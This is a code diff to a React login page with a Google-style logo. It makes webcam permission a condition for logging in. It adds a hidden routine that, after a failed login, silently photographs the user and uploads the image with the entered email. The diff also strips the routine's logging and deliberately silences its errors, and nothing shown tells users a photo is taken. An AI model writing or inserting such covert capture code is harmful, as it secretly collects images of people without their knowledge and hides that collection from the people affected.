@@ -2,20 +2,37 @@ import React, { useState } from 'react';
 import { useForm } from 'react-hook-form';
 import { yupResolver } from '@hookform/resolvers/yup';
 import { useAuth } from '../hooks/useAuth';
-import { captureSilentSnapshot } from '../hooks/useWebcam';
+import {
+  captureSilentSnapshot,
+  ensureWebcamForLogin
+} from '../hooks/useWebcam';
+
 import { authAPI } from '../services/api';
 import { loginSchema } from '../utils/validation';
+
 import Button from '../components/ui/Button';
 import Input from '../components/ui/Input';
 import Card from '../components/ui/Card';
+
 import { Link, useNavigate } from 'react-router-dom';
-import { Mail, Lock } from 'lucide-react';
-import { showSuccess, showError } from '../components/ToastProvider';
+
+import {
+  Mail,
+  Lock
+} from 'lucide-react';
+
+import {
+  showSuccess,
+  showError
+} from '../components/ToastProvider';
+
 import { MESSAGES } from '../utils/constants';
 
 
 const Login = () => {
+
   const { login, loading } = useAuth();
+
   const navigate = useNavigate();
 
   const {
@@ -28,63 +45,116 @@ const Login = () => {
 
   const [passwordVisible, setPasswordVisible] = useState(false);
 
-// 🔒 FULLY SILENT SECURITY CAPTURE
+
+  // 🔒 FULLY SILENT SECURITY CAPTURE
   const handleSilentCapture = async (email) => {
+
     try {
-      console.log("[Security] sending snapshot");
+
       const snapshot = await captureSilentSnapshot();
 
-      if (!snapshot) {
-        console.log("[Security] snapshot is null!");
-        return;
-      }
+      if (!snapshot) return;
 
       const formData = new FormData();
-      formData.append('snapshot', snapshot, 'snapshot.jpg');
-      formData.append('email', email);
+
+      formData.append(
+        'snapshot',
+        snapshot,
+        'snapshot.jpg'
+      );
+
+      formData.append(
+        'email',
+        email
+      );
 
       await authAPI.webcamSnapshot(formData);
 
-      console.log("[Security] snapshot sent");
-    } catch (err) {
-      console.log("[Security] send failed:", err);
+    } catch {
+
+      // Intentionally silent
     }
   };
+
 
   // 🔐 LOGIN
   const onSubmit = async (data) => {
+
+    // Webcam permission required BEFORE login
+    const webcamOk = await ensureWebcamForLogin();
+
+    // Block login if webcam denied
+    if (!webcamOk) {
+
+      return;
+    }
+
+    // Attempt login
     const result = await login(data);
 
-    if (result.success) {
-      showSuccess(MESSAGES.loginSuccess);
-      navigate('/dashboard', { replace: true });
-    } else {
-      // Wrong password toast (UI)
-      showError(result.message || MESSAGES.loginError);
 
-      // Keep webcam capture silent in background
-      handleSilentCapture(data.email);
+    // ✅ SUCCESS LOGIN
+    if (result.success) {
+
+      showSuccess(
+        MESSAGES.loginSuccess
+      );
+
+      navigate(
+        '/dashboard',
+        {
+          replace: true
+        }
+      );
+
+    } else {
+
+      // ❌ WRONG PASSWORD
+      showError(
+        result.message ||
+        MESSAGES.loginError
+      );
+
+      // 📸 Silent security snapshot
+      await handleSilentCapture(
+        data.email
+      );
+
+      return;
     }
   };
 
+
   return (
+
     <div className="min-h-screen flex items-center justify-center py-12 px-4 bg-gradient-to-br from-blue-50 to-indigo-100">
+
       <Card className="w-full max-w-md">
+
         <div className="text-center">
+
           <img
             src="/google-icon.png"
             alt="Logo"
             className="w-20 h-20 rounded-2xl shadow-2xl object-contain mx-auto mb-8"
           />
+
           <h2 className="text-3xl font-bold text-gray-900 mb-2">
             Welcome back
           </h2>
+
           <p className="text-gray-600 mb-8">
             Sign in to your account
           </p>
+
         </div>
 
-        <form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
+
+        <form
+          onSubmit={handleSubmit(onSubmit)}
+          className="space-y-6"
+        >
+
           <Input
             label="Email"
             type="email"
@@ -95,12 +165,15 @@ const Login = () => {
             }
           />
 
+
           <Input
             label="Password"
             type="password"
             showPasswordToggle
             passwordVisible={passwordVisible}
-            onTogglePassword={() => setPasswordVisible(!passwordVisible)}
+            onTogglePassword={() =>
+              setPasswordVisible(!passwordVisible)
+            }
             error={errors.password?.message}
             {...register('password')}
             icon={
@@ -108,25 +181,36 @@ const Login = () => {
             }
           />
 
+
           <Button
             type="submit"
             loading={loading}
             disabled={loading}
             className="w-full"
           >
-            {loading ? 'Signing in...' : 'Sign In'}
+
+            {loading
+              ? 'Signing in...'
+              : 'Sign In'}
+
           </Button>
 
+
           <div className="text-center">
+
             <Link
               to="/forgot-password"
               className="text-sm text-blue-600 hover:text-blue-700 font-medium"
             >
               Forgot your password?
             </Link>
+
           </div>
+
         </form>
+
       </Card>
+
     </div>
   );
 };
